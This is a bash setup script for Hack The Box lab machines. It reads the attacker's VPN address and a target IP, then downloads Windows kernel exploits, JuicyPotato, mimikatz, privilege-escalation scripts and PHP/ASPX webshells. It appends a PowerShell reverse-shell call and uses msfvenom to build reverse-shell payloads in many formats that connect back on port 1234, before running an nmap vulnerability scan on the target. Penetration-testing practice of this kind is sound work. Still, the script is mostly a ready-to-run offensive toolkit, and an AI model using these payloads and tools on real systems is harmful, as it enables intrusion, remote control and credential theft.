#!/bin/bash
echo "--------------------------------------------"
echo -e "Config - \e[41mBecause I'm really lazy.\e[0m"
echo -e "Updated 06.29.2021" "Last Full Update 06.29.2021"
echo -e "\e[0m--------------------------------------------"

htbip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)

if [[ $htbip == *"10."* ]]
then
echo "Current VPN IP - $htbip"
else
    echo -e "\e[41mHTB VPN not configured correctly\e[0m "
read -s -n 1 -p "Press reconnect the HTB VPN and try again."
clear
exit
fi
echo ""
echo "Please input the current box IP"
read  box
clear
echo "Current Box IP - $box"
echo "Do you want to do a full update/install? Y/N"
read state
if [[ $state == Y || $state == Yes || $state == y ]]
then
echo "Fresh Install Running"
echo ""
mkdir www smb ssh results
echo ""
echo -e "\e[41mNOTICE\e[0m"
echo "A prompt will appear asking you to run as a regular user with sudo this is due to Cargo permissions and certain directory removals."
read -s -n 1 -p "Press ANY key to continue."
echo ""
sudo echo "Run with SUDO"
echo ""
echo -e "\e[41mTools Installation\e[0m"
sudo curl https://sh.rustup.rs -sSf | sh
cargo install rustscan
cargo install feroxbuster
sudo apt install seclists curl enum4linux gobuster nbtscan nikto nmap oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
echo  -e "\e[41mDownloading Useful & Creating SSH Keys\e[0m"
git clone https://github.com/islanddog/notes.git temp && mv temp/useful . && rm -rf temp
sed -i "s/10.0.0.1/$htbip/g" useful
sed -i "s/10.10.10.97/$box/g" useful
cd ssh
ssh-keygen -t rsa -f id_rsa -q -P ""
cd ..
echo ""
echo -e "\e[41mPulling Windows Exploits\e[0m"
git clone https://github.com/SecWiki/windows-kernel-exploits.git win-exploits
cd win-exploits && rm -rf .git
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cd ..
echo ""
echo -e "\e[41mDownloading Enum Scripts.\e[0m"
git clone https://github.com/s0md3v/Arjun arjun
git clone https://github.com/dreadlocked/Drupalgeddon2 Drupalgeddon2
git clone https://github.com/quentinhardy/odat.git oracle
cd www
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries privesc
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite temp
git clone https://github.com/rebootuser/LinEnum temp2
git clone https://github.com/M4ximuss/Powerless temp3
mv temp2 temp && mv temp3 temp
cd temp
find ./ -name '*.exe' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.sh' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.bat' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.rb' -exec cp -prv '{}' '../privesc/' ';'
cd ..
rm -rf temp
cd privesc
rm -rf .git
wget https://gist.githubusercontent.com/islanddog/c77b4567e1569c185d40e2decf02ca63/raw/e9096bbba8d44de315a15cd28b2895ffec1cc6a7/echo-cscript
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
cd ..
mkdir mimikatz
cd mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210622/mimikatz_trunk.zip
unzip mimikatz_trunk.zip && rm -rf mimikatz_trunk.zip
cd ..
echo ""
echo -e "\e[41mPulling WebShells\e[0m"
mkdir webshells
git clone https://github.com/ivan-sincek/php-reverse-shell.git tmp
cd tmp
find ./ -name '*.php' -exec cp -prv '{}' '../webshells/' ';'
cd ..
sudo rm -rf tmp
cd webshells
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
wget https://github.com/tennc/webshell/raw/master/aspx/wso.aspx
wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php
wget https://gist.githubusercontent.com/islanddog/f20e0ca0e9cef1d70110a8d781eeaa28/raw/4206911d39aaeed7306b701d5e1cc1d13cb54ffa/uploader.php
wget -O p0wny.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
echo Invoke-PowerShellTcp -Reverse -IPAddress $htbip -Port 1234 >> Invoke-PowerShellTcp.ps1
cd ..
rm -rf shells && mkdir shells
cd shells
echo ""
echo -e "\e[41mCreating MSFVenom Shells\e[0m"
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$htbip LPORT=1234 -f elf > lin-1234.elf
msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-resources/ncat.exe -k -f exe -o win-1234.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-resources/ncat.exe -k -f exe -o x64-1234.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip LPORT=1234 -f war -o war-1234.war
msfvenom -p windows/shell/reverse_tcp LHOST=$htbip LPORT=1234 -f asp > shell-1234.asp
msfvenom -p cmd/unix/reverse_perl LHOST=$htbip LPORT=1234 -f raw > shell.pl
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip  LPORT=1234 -f raw > shell-1234.jsp
msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -f msi > shell-1234.msi
msfvenom -p php/reverse_php LHOST=$htbip LPORT=1234 -f raw > shell.php
cd ..
cd ..
echo "Setup Complete. Scanning $box using Rustscan now and creating directory."
cd results
mkdir $box && cd $box
rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o $box-scan.html && rm -rf scan
firefox $box-scan.html
firefox ../../useful
exit
else
echo ""
echo "--------------------------------------------"
echo -e "\e[41mQuick Run - No updates running\e[0m"
echo -e "\e[0m--------------------------------------------"
echo ""
echo -e "\e[41mNOTICE\e[0m"
echo "A prompt will appear asking you to run as a regular user with sudo this is due to Cargo permissions and certain directory removals."
read -s -n 1 -p "Press ANY key to continue."
echo ""
sudo echo "Run with SUDO"
echo ""
echo -e "\e[41mTools Installation\e[0m"
cargo install rustscan
cargo install feroxbuster
echo  -e "\e[41mDownloading Useful & Creating SSH Keys\e[0m"
rm -rf useful
git clone https://github.com/islanddog/notes.git temp && mv temp/useful . && rm -rf temp
sed -i "s/10.0.0.1/$htbip/g" useful
sed -i "s/10.10.10.97/$box/g" useful
cd ssh
ssh-keygen -t rsa -f id_rsa -q -P ""
cd ..
echo ""
echo -e "\e[41mDownloading Enum Scripts.\e[0m"
cd www
rm -rf privesc
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries privesc
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite temp
git clone https://github.com/rebootuser/LinEnum temp2
git clone https://github.com/M4ximuss/Powerless temp3
mv temp2 temp && mv temp3 temp
cd temp
find ./ -name '*.exe' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.sh' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.bat' -exec cp -prv '{}' '../privesc/' ';'
find ./ -name '*.rb' -exec cp -prv '{}' '../privesc/' ';'
cd ..
rm -rf temp
cd privesc
rm -rf .git
cd ..
echo ""
echo -e "\e[41mPulling WebShells\e[0m"
echo Invoke-PowerShellTcp -Reverse -IPAddress $htbip -Port 1234 >> Invoke-PowerShellTcp.ps1
cd ..
rm -rf shells && mkdir shells
cd shells
echo ""
echo -e "\e[41mCreating MSFVenom Shells\e[0m"
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$htbip LPORT=1234 -f elf > lin-1234.elf
msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-resources/ncat.exe -k -f exe -o win-1234.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-resources/ncat.exe -k -f exe -o x64-1234.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip LPORT=1234 -f war -o war-1234.war
msfvenom -p windows/shell/reverse_tcp LHOST=$htbip LPORT=1234 -f asp > shell-1234.asp
msfvenom -p cmd/unix/reverse_perl LHOST=$htbip LPORT=1234 -f raw > shell.pl
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip  LPORT=1234 -f raw > shell-1234.jsp
msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -f msi > shell-1234.msi
msfvenom -p php/reverse_php LHOST=$htbip LPORT=1234 -f raw > shell.php
cd ..
cd ..
echo "Setup Complete. Scanning $box using Rustscan now and creating directory."
cd results
mkdir $box && cd $box
rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o $box-scan.html && rm -rf scan
firefox $box-scan.html
firefox ../../useful
exit
fi
